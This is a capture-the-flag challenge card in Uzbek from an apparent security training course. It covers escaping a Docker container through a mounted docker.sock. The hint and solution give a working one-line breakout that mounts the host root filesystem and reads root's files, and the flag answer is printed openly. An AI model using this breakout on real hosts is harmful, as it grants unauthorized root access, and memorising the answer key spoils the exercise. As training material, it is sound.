---
id: 47
title: "CH47: Docker.sock Escape Host Root Filesystem Mount"
module: "Modul 5: Automation, Systemd & Kernel"
difficulty: Hard
points: 9
tags: ['docker', 'container-escape', 'docker-sock', 'privesc']
flag: "HD{docker_sock_container_breakout_root_mount_947}"
---

# 🎯 Topshiriq #47: CH47: Docker.sock Escape Host Root Filesystem Mount

## 📌 Metama'lumotlar:
* **Modul:** `Modul 5: Automation, Systemd & Kernel`
* **Qiyinlik darajasi:** `🔴 Hard`
* **Maksimal Ball:** `⭐ 9 ball`
* **Teglar:** #docker, #container-escape, #docker-sock, #privesc

---

## 📝 Topshiriq Senariysi (Scenario):
Sizning konteyneringizga `/var/run/docker.sock` ulab berilgan. Docker CLI orqali asosiy xost operatsion tizimining ildiz katalogini (`/`) yangi konteynerga mount qiling.

---

## 💡 Kichik Maslahat (Hint):
> [!TIP]
> docker run -v /:/host -it alpine chroot /host cat /root/flag.txt

---

## 🛠️ Professional Yechim Ko'rsatmasi:
```bash
# Topshiriqni yechish bo'yicha ko'rsatma:
docker run -v /:/host -it alpine chroot /host cat /root/flag.txt
```

---

## 🚩 Maxfiy Flag:
`HD{docker_sock_container_breakout_root_mount_947}`
